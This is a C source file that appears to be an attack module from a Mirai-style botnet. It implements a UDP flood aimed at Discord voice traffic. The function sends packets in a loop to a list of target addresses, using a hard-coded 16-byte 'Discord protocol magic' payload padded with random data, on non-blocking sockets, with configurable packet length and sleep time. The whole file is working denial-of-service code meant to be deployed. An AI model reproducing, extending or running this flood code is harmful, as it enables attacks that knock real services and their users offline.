#define _GNU_SOURCE


#include "../../../../utils/headers/includes.h"
#include "../../../../utils/headers/util.h"
#include "../../../../utils/headers/resolver.h"
#include "../../attack.h"

// Discord protocol magic: \x13\x37\xca\xfe\x01\x00\x00\x00\x00\x64\x69\x73\x63\x6f\x72\x64
#define DiscordPayload (enc[PAYLOAD_DISCORD_FULL].string)
static const int PAYLOAD_SIZE = 16;

void flood_discord(struct flood *flood) {
    int i, fd;
    uint32_t dport = flood->settings->dest_port == 0xffff ? 80 : flood->settings->dest_port;
    int data_len = flood->settings->length == 0 ? 512 : flood->settings->length;
    
    // Legit UDP from kernel itself! No spoofing.
    if ((fd = sys_socket(AF_INET, SOCK_DGRAM, 0)) == -1) return;

    // Optional: make it non-blocking
    int flags = sys_fcntl(fd, F_GETFL, 0);
    sys_fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    unsigned char payload_buf[MAX_PACKET_SIZE];

    while (*flood->running) {
        for (i = 0; i < flood->num_of_targets; i++) {
            int actual_len = data_len;
            if (actual_len < PAYLOAD_SIZE) actual_len = PAYLOAD_SIZE;
            if (actual_len > 1460) actual_len = 1460;

            // Target dest
            struct sockaddr_in target_addr;
            target_addr.sin_family = AF_INET;
            target_addr.sin_addr.s_addr = flood->targets[i].addr;
            target_addr.sin_port = htons(dport);

            // Payload Logic
            memset(payload_buf, 0, sizeof(payload_buf));
            if (flood->settings->payload != NULL) {
                int p_len = strlen(flood->settings->payload);
                if (p_len > actual_len) p_len = actual_len;
                memcpy(payload_buf, flood->settings->payload, p_len);
                if (p_len < actual_len && flood->settings->random_data)
                    rand_str((char *)payload_buf + p_len, actual_len - p_len);
            } else {
                memcpy(payload_buf, DiscordPayload, PAYLOAD_SIZE);
                if (flood->settings->random_data && actual_len > PAYLOAD_SIZE) {
                    char *tail = (char *)payload_buf + PAYLOAD_SIZE;
                    int remain = actual_len - PAYLOAD_SIZE;
                    for (int j = 0; j < remain; j++) tail[j] = rand_cmwc() & 0xff;
                }
            }

            if (sys_sendto(fd, payload_buf, actual_len, MSG_NOSIGNAL | MSG_DONTWAIT, 
                       (void *)&target_addr, sizeof(struct sockaddr_in)) == -1) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) sys_usleep(100);
            }

            
        }
        if (flood->settings->sleep > 0)
                sys_usleep(flood->settings->sleep * 1000);
    }
}
